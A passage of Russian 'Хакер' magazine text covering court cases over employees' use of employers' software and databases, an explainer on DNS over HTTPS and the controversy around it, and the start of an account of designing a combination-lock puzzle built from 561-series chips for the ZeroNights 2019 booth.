равомерно зашел на сер вер своего работодателя. Затем он удалил отту да
программу «1С:Предприятие», а также базы данных бухгалтерского учета
за период с 2007 по 2011 год. В результате такие данные на серверах трех
подразделений хол динговой компании из дру гого города были уничтожены.
  Решение суда: наказание в виде шес ти месяцев исправительных работ
условно с испытательным сро ком шесть месяцев.


OpenSky-2 и Meridian
В Региональном информационно‐вычислитель ном центре «Пул ково» была
разработана компьютерная программа OpenSky‐2. Частью этой программы
был модуль Alerts. Другая компания — ООО «Аэро навигатор» — правооб‐
ладатель  программы  Meridian. Обе  компании  получили  свидетельства
о государственной регистрации своих программ для ЭВМ.
  Одним из соавторов OpenSky‐2 ока зался некий гражданин С. А. Сорокин,
работавший в тот период в РИВЦ «Пулково». Примечательно, что впоследс‐
твии он перешел работать в компанию «Аэронавигатор», где стал одним
из авторов программы Meridian. РИВЦ «Пулково» ситуация с Meridian не пон‐
равилась, и Центр подал иск к «Аэронави гато ру» со следующими требова‐
ниями:
 • признать нарушающими исклю читель ное право истца на программу Open‐
   Sky‐2 действия ответчика по использованию исходного текста модуля
   Alerts в составе программы Meridian, а также предос тавление исходного
   текста Alerts в Роспатент;
 • взыскать 5 миллионов рублей компенсации;
 • аннулировать свидетельство о государс твенной регис трации программы
   Meridian.

Была назначена судебная экспертиза, чтобы определить степень иден‐
тичности фрагментов исходных кодов программ OpenSky‐2 и Meridian.
   Согласно заключению эксперта, при ана лизе фрагментов исходных кодов
программных продуктов OpenSky‐2 и Meridian было установлено различие
(две строки) в наиме новании ветки реес тра, исполь зующей ся для хранения
настроек, определяющих методы функционирования программы. В резуль‐
тате исследования исходных кодов OpenSky‐2 и Meridian установлено, что
программа Meridian пол ностью идентична OpenSky‐2.
  В итоге суд признал действия ответчика (вклю чившего исходный текст
модуля Alerts в состав программы Meridian и предос тавившего его исходный
текст в Роспатент) нарушением интеллектуальных прав РИВЦ «Пул ково»
с назначени ем выплаты компенсации в раз мере 500 тысяч рублей в пользу
истца.

«Апте ка‑Урал» и QuartFarm
ООО «Аурит» принадлежали права на прог раммный комплекс для автомати‐
зации аптечных предприятий «Аптека‐Урал». Дру гая компания — ООО
«Кварт» — обладала исклю читель ным пра вом на систему для автоматизации
фармацевтических предприятий QuartFarm. Обе эти компьютерные прог‐
раммы были  зарегистрирова ны  в  государс твенном реестре  программ
для ЭВМ. Соавторами QuartFarm зна чились М. А. Коркунов, М. В. Фёдоров
и П. А. Разбойников — бывшие работники ООО «Аурит».
  ООО «Аурит» посчитало, что программа QuartFarm — это переработанная
версия их собственной программы «Аптека‐Урал». Поскольку между компани‐
ями не было никаких договорных отношений по использованию «Апте‐
ки‐Урал» для подобных целей, ООО «Аурит» подало иск в суд на ООО
«Кварт».
  В этом деле также не обошлось без судеб ной экспертизы, результатом
которой был следующий вывод: программа QuartFarm не тождественна прог‐
рамме «Аптека‐Урал», но программа QuartFarm — результат переработки
«Аптеки‐Урал».
  Суд признал факт нарушения исключительных прав ООО «Аурит», зап‐
ретив распространять и использовать QuartFarm, приз нав недействительной
государственную регистра цию этой программы и пос тановив выплатить ком‐
пенсацию в размере 500 тысяч рублей.


             INFO

                    Более полную подборку примеров судеб ных раз‐
                       бирательств в России в отношении софта можно
                      найти, например, здесь.



КОНФЛИКТЫ ИЗ-ЗА БАЗ ДАННЫХ И НОУ-ХАУ
До судов доходят и споры о неправомерном использовании баз данных.
Один из таких примеров я приведу ниже.


База дан ных маршру тов wikiroutes.info
ООО «Викирутс» в 2016 году ста ло правообладателем базы данных маршру‐
тов wikiroutes.info. А гражданин А. Е. Цуканов обла дал исключительным пра‐
вом на базу данных «Расписание общественного транспорта GoOnBas.ru»
(дата  государственной  регистрации  в  реес тре  баз  данных  4  апре‐
ля 2018 года).
  ООО «Викирутс», полагая, что Цуканов несанкционированно извлек копию
базы данных маршрутов wikiroutes.info и использовал ее для рас пространения
информации о движении транспорта на своем сайте с целью получения при‐
были, подало на него в суд.
  На помощь суду снова пришли эксперты. Согласно выводам экспертизы,
база данных, исполь зуемая на сайте https://goonbus.ru, и база данных с сайта
https://wikiroutes.info по типу визуального представления информации (мно‐
гоуровневые списки), наполнению (характеристики маршру тов, последова‐
тельность изложения данных) схожи до степени смешения, так как первая
упомянутая база является переработкой второй.
  На основании материалов дела и имевшихся доказательств суд установил:
база данных маршрутов wikiroutes.info — это база данных по смыслу п. 2 ст.
1260 ГК РФ, а доказа тельств наличия  у ответчика лицензии, договора
или иного разрешения правообладателя на использование спорной базы
по транспортным маршру там не было представлено.
   Также Цуканов не представил убедительных доказательств того, что све‐
дения о маршрутах для наполнения своей базы он получил из иных источни‐
ков, помимо https://wikiroutes.info.
  В итоге суд вынес решение прекратить незаконное использование
Цукановым базы данных «Маршруты wikiroutes.info», а также обязал его вып‐
латить истцу 100 тысяч рублей компенсации за нарушение прав на эту базу
данных.
   Ноу‐хау (или, другими словами, секрет производства) — самостоятельный
объект авторских прав, который тесно связан с режимом коммерческой тай‐
ны. Несмотря на то что следующий пример не про программный код или базу
данных, в теории и то и дру гое вполне может быть секретом производства.
Подобных судебных дел много, предлагаю обра тить внимание на одно из них.


Парокон денсатные системы
Один из сотрудников компании «Спиракс‐Сарко Инжиниринг» во время
работы в ней узнал ноу‐хау пароконденсатных систем. Потом он уволился,
учредил свою компанию, стал продавать продукт на основе этого секрета
производства, опубликовал на сайте своей компании чертежи. Компания
«Спиракс‐Сарко Инжиниринг» посчитала, что этот товарищ нарушил ее права
на ноу‐хау, и подала на него в суд.
  Однако суд вынес решение в пользу сотрудника. Причина следующая: хотя
компания и вве ла режим коммерческой тайны у себя на предприятии, под‐
готовила нужные локальные нормативные акты, но в составе конфиденциаль‐
ных сведений отсутствовали наз вания агрегатов и чертежей (в том числе
и тех, что были опубликованы бывшим сотрудни ком на сайте своей ком‐
пании). Поэтому истец не смог доказать, что секрет пароконденсатных сис‐
тем был коммерческой тайной. А при отсутствии доказательства сотрудник
не считается нарушившим пра ва компании на объ екты такой тай ны.


ИНЫЕ КОНФЛИКТЫ
Понятно, что в рамках одной статьи не охва тить всех судебных разбиратель‐
ств и иных конфликтов, пус кай и не дошедших до суда (тем более если мы
говорим не только о рос сийских реалиях). Но если тебе интересна эта тема
и хочется узнать больше деталей, рекомендую потратить свое время на изу‐
чение сле дующих историй.
 • Суд по иску Waymo к Uber в отношении коммерческой тайны по беспилот‐
  ным автомобилям.
 • Cуд по уголов ному делу в отношении исходно го кода и алгоритмов поис‐
   ковой системы «Яндекса».
 • Cуд между компанией Two Sigma Investments и ее бывшим сотрудником
  Каном Гао (Kang Gao) о кра же конфиденциальной информации.
 • Cуд между Microsoft и бывшим главным архитектором программного обес‐
   печения.
 • Cуд по претензиям Goldman Sachs к своему бывшему сотруднику.
 • Cуд между «Лабораторией Кас перско го» и компанией «Киберсекьюрити
   Солюшнс», созданной бывшими сотрудниками ЛК.
 • Cуд по иску Tesla к бывшему сотруднику Гуанчжи Цао (Guangzhi Cao).
 • Cуд по иску Мамичева к своему работодателю Veeam Software.
 • Уголовное дело за неп равомерное рас кры тие исходного кода «Лабора‐
   тории Касперского».
 • Обвинения NSO Group к своему бывшему сотруднику о хищении им прог‐
  раммного кода компании.
 • Конфликт между «Аско ном» и компанией SDI Solution, созданной бывшими
   сотрудниками «Аскона».


НАБЛЮДЕНИЯ И ВЫВОДЫ
На основе приведенных мною примеров, да и дру гих конфликтов, оставшихся
за рамками статьи, можно сделать следующие наб людения и выводы.
 1. Часто конфликты обусловлены тем, что работники не очень хорошо раз‐
   бираются, какие из результатов их работы считаются слу жебными про‐
   изведениями, исклю чительное пра во на которые принад лежит работо‐
   дателю.
 2. Разберись, что будет твоей личной интеллектуальной собственностью,
   а что из результатов твоего тру да принадлежит работодателю. Это даст
  понимание, что можно использовать на дру гой работе или в личных про‐
   ектах.
 3. Узнай у работодателя, что является секретом производства (ноу‐хау),
   на какие объекты на предприятии рас простра няется режим коммерческой
   тайны.
 4. Если самостоятельно все разузнать не уда лось, а получить разъ ясне ния
   от работодателя тоже не вариант (либо его пояснения вызывают сом‐
   нения), то стоит обратиться к профиль ному юристу, чтобы он помог тебе
   разобраться в собственных правах и воз можных последствиях действий.

В России и за рубежом много примеров, когда работодатели успешно прив‐
лекали к ответственности своих бывших сотрудни ков за нарушение ими прав
на свою интеллектуальную собственность. Есть и при меры, когда конфликты
сопровождались  уголовным  расследова нием  с  назначением  виновным
наказания. Имей это в виду, особен но если ты пла ниру ешь осложнить жизнь
своему любимому работодателю при уходе и тем самым «отблагодарить» его
за все былые заслуги.
 ПРИВАТНОСТЬ
 ГЛУБОКИЙ
    В-DOH





          РАЗБИРАЕМСЯ, КАК РАБОТАЕТ
         DNS OVER HTTPS И КОМУ (НЕ)
        atreau     ВЫГОДНО ЕГО ВНЕДРЕНИЕ
zinik.alexander@gmail.com





 Компании Mozilla и Google вкла дыва ют много сил во внед‐
 рение технологии DoH (DNS поверх HTTPS), обещая поль‐
 зователям повыше ние безопасности и приватности. В Firefox
 она уже включена по умолчанию, в Chrome ее будут тес‐
 тировать в версии 79, и даже в Microsoft обещают внедрить
 ее в Windows. Но при этом тех нологию многие критикуют,
 а Mozilla за свои ста рания получила номинацию на звание
 «интернет‐злодея года». Давай разберемся в нюансах этой
 истории.


 ШАТКАЯ СКРЕПА DNS
 Для порядка и связности изло жения кратко вспомним основные понятия.
 Система доменных имен DNS — одна из технологий, лежащих в самой осно‐
 ве современного интернета. С ее помощью соот носятся числовые IP‐адреса
 и более удобные для человека доменные имена. Она пос троена по принципу
 иерархического взаимо действия DNS‐серверов.
    Важный момент: разрабатывалась эта система еще в 1983 году, и поэтому
  у нее есть некото рые проблемы с безопасностью. Ведь интернет тогда,
  как известно, был сетью, которая связывала американские научные и воен‐
 ные учреждения, и подклю чать к ней кого попало не планировалось.





          DNS‐запрос и DNS‐ответ в базовом устрой стве системы

 Если вкратце, то корень проб лемы в том, что базовая система DNS принима‐
  ет и передает любые запросы, пос тупа ющие в нее. Как во многих других
 решениях, которые появились на заре интернета, защиты от злонамеренного
 использования здесь нет. В те времена считалось, что главное — это прос‐
  тота и масштабируемость.
   В результате появились раз ные методы атак на DNS‐серверы (например,
  отравление кеша DNS или перехват DNS). Результат таких атак — перенап‐
 равление  клиентских  бра узеров  куда‐то,  куда  пользователи  попадать
 не собирались.
    Для борьбы с этими бедами Ин женерный совет интернета разработал на‐
 бор расширений DNSSEC, который добавил к DNS‐запросам подпись‐аутен‐
 тификацию на основе криптогра фии с откры тым клю чом. Но разрабаты вался
  этот набор расширений очень долго. Проб лема стала оче видной еще в
 начале  девяностых,  направление  работы  над  проблемой  определили
  к 1993 году, пер вую версию DNSSEC подготовили к 1997 году, попытались
 внедрить, стали вносить изменения...
   В общем, к 2005 году была создана вер сия, подходящая для широкомас‐
 штабного использования, и ее начали внедрять, распространяя по зонам
 интернета и DNS‐серверам цепочку клю чей доверия. Внедряли тоже дол го —
 например, только к марту 2011 года была подписана зона .com.


              INFO

                        Если хочешь подробнее разобраться, от каких
                          угроз DNSSEC должен был защитить DNS, то
                     можешь почитать док лад об анализе угроз того
                        самого   Инженерного    совета    интернета
                           от 2004  года. Как пишут его авторы, спустя
                          десять лет после начала работ настало время
                          отчитаться о том, с какими проблемами и как
                      именно мы собираемся бороться.


 Но DNSSEC решает только часть проб лемы — он гарантирует аутентичность
 и целостность данных, но не их приватность. В борьбе за эту цель логичным
 средством выступает шифрование. Вопрос в том, как именно его реали‐
  зовать.


 ВАРИАНТЫ ШИФРОВАНИЯ
 Несколько групп разработчиков предложили свои варианты технологических
 решений. Среди них есть те, которые используют оригинальные способы
 шифрования, например DNSCrypt или DNSCurve, в котором при меняется
 шифрование с исполь зованием эллипти чес ких кри вых. Но решения, оказав‐
 шиеся в итоге более популярными, опи раются на широко распространенный
 протокол безопасности TLS. Такими решениями являются DoT (DNS over TLS)
 и DoH, основной предмет этой статьи.
     DoT, как и следует из его названия, использует для зашифрованной
 передачи DNS‐запросов сам протокол TLS. Это влечет за собой сме ну
 основных портов и протоколов — вместо UDP по порту 53 используется TCP
 по порту 853.
   DoH устроен иначе и по‐дру гому использует TLS. В DoH TLS‐шифрование
 применяется на уровне протокола HTTPS, с использованием HTTPS‐зап‐
 росов и обращением к HTTP‐портам DNS‐сервера.
    Звучит сложновато? Ян Шауман рас ска зывает об этом очень точно
 и доходчиво:



       Пос кольку HTTPS использует TLS, можно было бы позанудс твовать
       и подока зывать, что техничес ки DoH — это тоже DNS через TLS.
       Но это было бы невер но. DoT отправ ляет зап росы базового протокола
      DNS через TLS-соединение на отдельном выделенном пор те. DoH
        использует протокол HTTP на уров не протокола прик ладного уров ня
       (HTTP application layer protocol), чтобы отправ лять зап росы на HTTPS-
        порт сер вера, используя и вклю чая все эле менты обыч ных сообщений
        HTTP.





                DoH: DNS‐сооб щения завернуты в HTTPS


 DOHОДИМ ДО СУТИ
 Здесь резонно задаться вопросом: а в чем вооб ще тут может быть проб‐
 лема? Чем больше безопасности, тем лучше, раз ве не так?
    Ответ на этот вопрос лежит в нюансах выб ранных решений, их сильных
 и слабых сторонах. А именно в том, как новая технология взаимодействует
 с разными участниками системы DNS, кого из них ее раз работчики счи тают
 условно заслуживающими доверия, а кого — источниками угрозы. И речь
 сейчас даже не о хакерах‐зло умышленниках, имеющих откровенно прес‐
 тупные цели.
    Речь о том, что между пользователь ским устройством и конечным сайтом
  находятся посредники. Администра тор сети, файрвол, провай дер интерне‐
  та — все они могут в сво их интересах взаимодей ствовать с системой DNS,
 задавая своим резол верам имен DNS нас трой ки того, какие запросы отсле‐
  живать, блокировать, модифицировать. Так можно встраивать рекламу, отсе‐
  кать вредоносный контент, не пус кать на определенные ресурсы...





    Путь запроса от клиента до сервера может про ходить через множество
   резолверов

  DoT, работая через TLS с его системой сертифика тов доверия, точно так же
 нуждается в DNS‐резол вере, которому он смо жет доверять. Присутствует
 гибкая возможность настройки списка доверенных резолверов, возможность
 централизованного изменения настроек в предварительно доверенной (нап‐
 ример, корпоратив ной) среде, а также возможность переключаться обратно
 на базовый DNS, если с новой версией возникнут проблемы.
    Поскольку для DoT используется новый, выделенный порт, возможно
 заметить передаваемый тра фик и наблюдать за его объ емами, шифрование
  этому никак не помешает. При желании можно даже заблокировать его вов‐
  се.
   В общем, DoT нужно гра мотно настроить, но зато он содержит некоторые
 крайне полезные для системных администраторов и сетевых инже неров фун‐
  кции. Поэтому многие из профес сиона лов и хва лят за это DoT.
   С DoH история дру гая. Эта технология раз рабатывалась с расчетом
 на пользовательские приложения, а именно — браузеры. Это ключевая
 деталь во всей этой истории. Озна чает она вот что. При использовании DoH
 весь трафик, который не относится к браузерам, идет через базовый DNS,
 но браузерный трафик при этом обходит любые нас тройки DNS — на уровне
 операционной системы, локальной сети, провайдера — и, минуя промежуточ‐
 ные этапы, по HTTPS попадает сра зу к поддерживающему DoH резолверу
 DNS.
   И к этой схеме есть ряд серьезных вопросов.


 КОВАРНЫЕ ЗЛОДЕИ И ТЕОРИИ ЗАГОВОРА
 Вот мы  и  доб рались  до  рассказа  о  том,  кто  номини ровал  Mozilla
  в «интернет‐злодеи года». Это британская Ассо циация интернет‐провай‐
 деров и британский же Фонд надзора за интернетом. Эти организации отве‐
 чают за блокиров ку нежелательного контента для британских пользователей
 интернета. В основном они борются с детской порнографией, но пиратство,
  экстремизм и всякий другой криминал их тоже интересует. А еще одно вре мя
 они пытались запретить британским пользователям интернета BDSM‐пор‐
 нографию, но потерпели неуда чу.
    Так вот, эти организа ции полага ют, что внедрение DoH существенно сузит
  их возможности контролировать доступ к контенту. Их опасения разделяют
 не только провайдеры в других стра нах, но и профессионалы в области
 кибербезопасности, которые отмечают, что с такими же проблемами стол‐
  кнутся разработчики файрволов и систем мониторинга DNS. А от этого пос‐
  традает защита кор поративных сетей, и у сотрудни ков появятся новые воз‐
 можности загрузить вирус по фишинговой ссылке. Мало того, уже есть при‐
 меры, как злоумышленники зло употребляют воз можнос тями DoH.
   В Америке Google и Mozilla из‐за DoH вступили с провайдерами в юри‐
 дическую войну. Сначала провайдеры обра тились к конгрессу США с пись‐
 менной просьбой обра тить внимание на воз можные последствия внедрения
 DoH. Менеджеры Google тут же поспешили за верить всех, что опасности пре‐
  увеличены. А вот представители Mozilla сами обратились к конгрес су с прось‐
 бой изучить практику сбора пользовательских данных провайдерами, открыто
  намекая, что про вайдеры отстаивают свои специфичес кие инте ресы.
   Но с бизнес‐интересами провайдеров все понят но. А каковы интересы
  сторонников скорейшего внедрения DoH? Почему сот рудники Google и Mozil‐
  la всячески уверяют, что это все пока только эксперимент, и что если поль‐
 зователей Великоб ритании необходимо защищать от порнографии, то их
  в эксперимент не включат, и что они всего лишь хотят скорее даровать поль‐
 зователям (в том числе — жителям стран с авторитарными мерами контроля
 интернета) больше приватности и безопасности?
    Некоторые спе циалис ты полага ют, что дело в резол верах DNS с поддер‐
 жкой DoH. И в Google, и в Mozilla утвержда ют, что их браузе ры будут исполь‐
  зовать целый список таких резолверов, но на практике — у Google есть свой
 собственный DNS‐сервер, а Mozilla разрабатывает свое решение в тес ном
  сотрудничестве с компанией Cloudﬂare. Та тоже предос тавляет собс твенный
 DNS.
    Если вдобавок к это му вспомнить, что Chrome сей час самый популярный
 браузер, то вырисовыва ется не слишком при ятная картинка. В распределен‐
 ной и децентрализованной системе DNS в одночасье появится огромный
  сегмент, подконтрольный Google, и сегмент поменьше, принадлежащий
  Cloudﬂare. Ничего личного, ува жаемые провай деры, просто бизнес. Были
 данные ваши, а стали наши!





   Доля браузеров на рын ке. С огромным отрывом лидирует Chrome,
    за ним — Safari, все остальные далеко позади

  Mozilla в своем FAQ по внедрению DoH утвержда ет, что DNS‐резолвер Cloud‐
  ﬂare был выбран не потому, что Cloudﬂare пла тит за это деньги. Mozilla
 и Cloudﬂare якобы никак не намерены монетизировать данные, проходящие
 через их серверы, и заин тересованы только в борьбе за приватность
 и безопасность использования интернета.
    Что  ж, по меркам корпораций  Cloudﬂare  хотя бы немного похожа
 на искреннего союз ника в этой борьбе — компания много раз заявляла
 о своей приверженности ценностям свободы интерне та, сетевой нейтраль‐
 ности и свободы сло ва, и в ее случае такие заявления работают на ее имидж
 важного игрока на бурно растущем и раз вивающемся рынке циф ровой при‐
  ватности и безопасности. А вот с Google дело выглядит куда более подоз‐
 рительно.


            WARNING

                       Отдельно и особо напоминаем:  никакая  тех‐
                         нология сама по себе не может обеспечить тебе
                        абсолютную безопасность в Сети. В этой статье
                         речь идет только о безопасности DNS. Безопас‐
                          ность других протоколов и сценариев исполь‐
                         зования интернета ник то не отменяет! Худший
                          враг безопасности — уверен ность, что ты сделал
                        достаточно.


 Google стре мительно движется к тому, чтобы монополизи ровать ключевые
 для интернета сервисы, а некоторые уже монополизированы. И кроме эко‐
 номических и политических аспектов, тут есть и чис то технические. Отсутс‐
  твие централизации заложено в протоколы интернета умышленно — ведь
 современный интернет вырос из американской военной разработки, одной
 из целей которой было сохранение свя зи между ее участниками после атом‐
 ных ударов. Если какая‐то катастрофа физичес ки уничтожит часть дата‐цен‐
  тров, серверов или линий связи, интернет дол жен это пережить.
   Но если несколько ком паний начнут экс клюзивно пре дос тавлять важные
 функции, то что будет, например, в случае банкротс тва одной из них? Это,
 конечно, все чисто философские вопросы, но обду мать их стоит. Например,
  сотрудники Азиатско‐тихо океанского сетевого информационного центра
  (APNIC) полагают, что внедрение DoH — повод для серьезных исследований
  степени централизации системы DNS, и намерены вни мательно сле дить
 за процессом.


 ВЫВОДЫ
 Подведем итоги. И начнем с того, что можно утверждать с полной уверен‐
  ностью.
    Технология DoH осложнит жизнь всем тем, кто хочет или вынужден наб‐
 людать за DNS‐трафиком пользователей. В их числе — провайдеры, сис‐
 темные администраторы, разработчики и операто ры файрволов и фильтров
 контента, правительственные агентства по надзору за интернетом.
    Насколько сильно DoH осложнит им жизнь? Никто не может сказать точ‐
 но — все зависит от темпов внедрения и проработанности технологических
 решений.
    Нужна ли эта технология интернету? Сложный вопрос. Эксперты соглаша‐
  ются, что улучшать безопасность DNS необ ходимо, но не соглашаются о том,
  как именно, — и много сокруша ются, что разработ ка новых решений ведется
 излишне поспешно, внедряется с тру дом и в итоге переусложняет техничес‐
 кое устройство до такой степени, что в нем становится не разобраться даже
 профессионалам.
    Нужен ли DoH лично тебе? Как и во многих других случаях, вопрос скорее
  в том, какая угроза тебе кажется более приори тет ной. Если это провай деры,
 которые делают что‐то, что тебе не по душе, или фильтры контента, о которых
 ты не просил (например, правительственные), — то, возможно, тебе при‐
  годится еще один инструмент. Если тебя больше беспокоят злоумышленни ки
 или тебе нужно следить, чтобы какие‐то пользователи не ходили, куда не сле‐
  дует, — стоит прицельно изучить, как эта тех нология будет взаимодейство‐
  вать с твоими задачами.
    «А зачем вообще мне вся эта ерунда, у меня есть хороший прокси и Tor
  в качестве запасного варианта?» — спросишь ты. Если так, то тебе все
  это действительно не нужно. Но не нужно — не значит неинтересно.
 К счастью или сожалению, в интернете компанию нам составляют миллиарды
 обычных пользователей‐неспециалистов, обитателей корпоративных сетей,
 молчаливых и незаметных устройств сетевой инфраструктуры и модных пред‐
  ставителей «интернета вещей». И на них все описанное в статье может серь‐
 езно повлиять. А как именно и с какими пос ледствиями — никто пока не зна‐
  ет.
   И напоследок: специалисты Mozilla утверждают, что в некоторых слу чаях
 использование DoH существенно уско ряет обработку DNS‐запросов. Если
 они  окажутся  правы,  то  из  «интернет‐злодея  года»  превратятся
  в «интернет‐супергероев». И, как говорится в историях про героев и злодеев,
 продолжение следует.
ТРЮКИ





            faberge
    Цифровыхъ дѣлъ мастеръ
    fabulous.faberge@yandex.ru

ИСТОРИЯ
КОДОВОГО
ЗАМКА

 КАК Я РАЗРАБОТАЛ
 ЗАДАНИЕ
 НА СХЕМОТЕХНИКУ
 ДЛЯ СТЕНДА «ХАКЕРА»
 НА ZERONIGHTS




12 и 13 ноября в Санкт‐Петер бурге проходила ежегодная
международная конференция по практической информа‐
ционной безопас ности  ZeroNights  2019. Журнал «Хакер»
участвовал в мероприятии в качестве информационного
партнера, а на нашем стенде, помимо стикеров и скидочных
купонов на подписку, можно было найти занятную вещь —
элек тронный кодовый замок. Раскрыть его предлагалось
при помощи  мультиметра,  познаний  в  электротехнике
или просто смекалки.





В августе этого года я уже успел побывать на Chaos Constructions (он, кстати,
тоже проводится в Питере) и обра тил внимание на то, какой популярностью
пользуется спортивный локпикинг — взлом замков с помощью отмычек и под‐
ручных средств.





                    Стенд «Хакера» на ZeroNights





             Донские казаки взламыва ют кодовый замок

Меня это, как ни странно, оста вило равнодушным, но идея была инте ресная,
и я решил попробовать ее творчески переосмыслить. Хотя и тут я не был пер‐
вопроходцем: если кто‐то читал учебник Харриса и Харрис «Цифровая схе‐
мотехника», то там одна из задач была на реверс схемы цифрового замка.
Требовалось восстановить по схеме работу конечного автомата и диаграмму
его внутренних состояний и узнать код дос тупа.





                        Что получилось в итоге

Однако в таком виде схема не годилась для реализации «в железе»: во‐пер‐
вых, авторы исходили из того, что используются «идеальные» кнопки без дре‐
безга контактов; во‐вто рых, тактирование для схемы было чисто внешним.
Таким образом, нажатие на кноп ку и тактовый сиг нал были асинхронными
по отношению друг к дру гу, и пользователю, если бы он попытал ся ввести
код, потребовалось бы подгадывать свои действия под обновле ние сос‐
тояния в системе.
  Разумеется, подоб ное вза имодействие для реального устройства сложно
назвать естественным и интуитивным, поэтому схема нуждалась в доработке.
Но само направление мне показа лось верным, и я решил двигаться дальше.
Первые наив ные попытки накидать схему на скорую руку выявили основную
проблему: внеш ним источником тактирования мог быть только пользователь‐
ский ввод (нажатие на кнопку). Но оно же было и информационным сигналом
в схеме! Таким образом, попытка захватить в какой‐нибудь триггер сос тояние
входного сигнала (по фронту или спа ду) неизбежно порождала неопределен‐
ность.


             INFO

                          Тут  следует  сделать  небольшое  отступление
                      и  заранее  предуп редить,  что  я  не  профес‐
                       сиональный разработчик цифровых схем. Основы
                   цифровой схемотехники я знаю ровно настолько,
                         что бы понимать, из чего состоят и как работа ют
                      простейшие компьютерные блоки: регистры, АЛУ,
                       память и прочее. Ничего сверхсложного я никог‐
                      да не реализовывал,  и, как должен работать
                      подобный цифровой  замок,  я  тогда понимал
                       для  себя  только  приблизительно,  в  теории.
                      Поэто му моя схема может быть неоп тимальной
                      и даже излишне запутан ной.


Тогда я решил подробнее ознакомиться с вопросом и полез в интернет
искать похожие примеры. Первые же ссылки в Яндексе помогли прояснить
несколько вещей: во‐первых, такие схемы есть; во‐вторых, почти все они мне
не понравились. Сейчас попробую объяснить почему. Я не буду здесь при‐
водить  ссылки  на  конкретные  работы,  чтобы  не  обижать  авторов.
При желании все можно легко найти самостоятель но.
   Так вот, как выяснилось, часть схем не предполагала сброса при неверной
комбинации — это облегча ло подбор. Дру гая часть не позволяла исполь‐
зовать одну и ту же цифру больше одного раза в пароле — это сокращало
пространство вариантов (при десяти цифрах и четырехзначном числе получа‐
ется 5040 комбинаций вместо 10 000!). Наконец, авторы некоторых примеров
мешали в одну кучу цифровую и ана логовую схемотехнику, что мне вообще
не понравилось.
  Поэтому я понял, что придется разрабатывать схему практически с нуля.
Ну что же, тем интерес нее! Хотя сроки поджимали. Как обычно, решение
об интерактиве для стенда приняли в последний момент и итоговый резуль‐
тат нужен был пусть и не «еще вчера», но через две недели или около того.
И это с учетом изготовления плат! В общем, приш лось поднажать.
  Я решил остановиться на 561‐й серии микросхем, просто потому, что
небольшое их количество у меня оста валось с предыду щих проектов. Кроме
того, у них широкий диапа зон входных напряжений — можно использовать
хоть батарейки АА, хоть «Крону». К тому же «Интеграл» выпускает их мас сово,
их  легко  достать  и  большинс тво  все еще  дос тупно  в  DIP‐корпусах.
Это облегчает реверс схемы — все‐таки проект делается преиму щественно
для развле чения.
   Ну и на самом деле — мне вообще нравят ся старые корпуса для мик‐
росхем. В них чувствуется какая‐то монументаль ность, классицизм, что ли.
Широкие  DIP‐40  для микропро цес соров  и микроконтроллеров, PLCC‐
44 для параллельной памяти и PLCC‐84 для микросхем CPLD. Я решил, что
стилистика ретро проекту не повредит, тем более что DIP в цанговых панель‐
ках (а я собирался исполь зовать имен но такие в конечном варианте) выглядят
просто потрясно, тут вряд ли у кого будут воз ражения.
  Первым делом нужно было решить проб лему с дре безгом. На страничке
«Википедии» приведена схема подавления дребезга кнопки с перекид ным
контактом  на  двух  вен тилях  2И‐НЕ.  Этому  соответствует  микросхема
К561ЛА7, и первоначально я использовал ее. У нее четыре логических вен‐
тиля, и это означало, что на каждый корпус я смо гу завес ти сигнал с двух кно‐
пок. Не сказать, конечно, что это много…





Мне нужно было десять кнопок для десяти цифр плюс кнопка сброса. Один‐
надцать в аккуратную мат рицу не рас кладывались (сюрприз!), поэтому я
решил увеличить их количество до двенадцати. А это уже целых шесть мик‐
росхем.  Как‐то  расточительно.  Тогда  я  пролис тал  список  микросхем
«Интеграла» еще  раз  и  обнаружил  подходящую  деталь —  К561ТР2.
Это четыре RS‐триггера в одном корпусе, а они как раз собираются из пары
вентилей И‐НЕ. Ура, беру их!
  Следующий шаг — соб рать счетчик. Схему нужно принудительно сбра‐
сывать, если пользователь не ввел пра вильный код за разрешенное чис ло
попыток, а это значит, что придется счи тать нажатия. Для этого тре буется
логический элемент 10ИЛИ, но в готовой микросхеме их не сущес твует. Тогда
я использовал обе половинки ИС К561ЛЕ6 (4ИЛИ‐НЕ), дополнительно вен‐
тиль от ИС К561ЛЕ5 (2ИЛИ‐НЕ) и объеди нил их с помощью ИС К561ЛА9
(3И‐НЕ).





Если вспомнить правила де Моргана, то инвертор с выхода элемента
ЛА9 можно переместить на его входы, при этом И поменя ется на ИЛИ, а сами
инверторы  взаимно аннигилируют с НЕ на выходах ИЛИ‐НЕ.  Получа‐
ется 10ИЛИ — как раз то, что нужно. Кроме того, я допол нительно инверти‐
ровал выходной сигнал, чтобы получить сброс по отжатию кнопки — когда
пользователь завершил ввод.
  Сам по себе счетчик стандартный и состоит из трех D‐триггеров на мик‐
росхемах К561ТМ2. Биты его сос тояния будут слу жить для индикации прог‐
ресса и для принудительного сбро са (нижняя часть второго листа схемы).
Здесь же впервые появляется сигнал от общего сброса, в котором участвует
и сигнал от кнопки сбро са.
  Наконец, центральная часть устройства, которая, собственно, и служит
для хранения правильной последова тельнос ти. Я специально не стал здесь
вводить дополнительное шифрование состояний конечного автомата. Да,
это позволило бы сок ратить количес тво используемых D‐триггеров, но отри‐
цательно сказалось бы на легкости воспри ятия схемы. Напомню, основное
назначение — это не чтобы «никто не решил», а чтобы большинство посети‐
телей смогло поучаство вать и получить свою порцию удовольствия. Все же
основные специализации у посетителей ZN — это веб, мобильные приложе‐
ния и прочие далекие от железа вещи.
   Итак, для кода исполь зуется пять зна чащих цифр и пять D‐триггеров.
Изначально я планировал всего четыре цифры и десять тысяч комбинаций,
но от схемы счетчика остался один «лишний» бит, поэтому я решил добавить
его сюда, в последовательность пароля. По сути, это «плюс 90 тысяч ком‐
бинаций за те же деньги!». Хороший маркетин говый ход, наверное. :)
   Здесь ключевую роль играет трехвходовый элемент И‐НЕ, который раз‐
решает подачу тактового сигнала на соответству ющий триггер тогда и только
тогда, когда предыдущий бит уже защелкнулся, а текущий еще в состоянии
нуля (логическая единица на инверсном выходе). Таким образом, набранные
в правильном порядке пять цифр пароля приводят к высокому уровню
на выходном сигнале ENABLE.





Этот выход, в свою очередь, соединен с микросхемой‐тай мером КР1006ВИ1
(аналог популярной ИС NE555). Она нас троена с помощью RC‐цепочки
на частоту в 10 Гц и отвечает за прос тенькую ани мацию на светодиодах типа
«бегущий огонек» (вторично используются светодиоды на шкале прогресса).
Я не буду подробно оста навливаться на схеме анимации, смысловой наг‐
рузки для основных задач проекта она не несет, разве что допол нительно
привлекает внимание, пока работает.
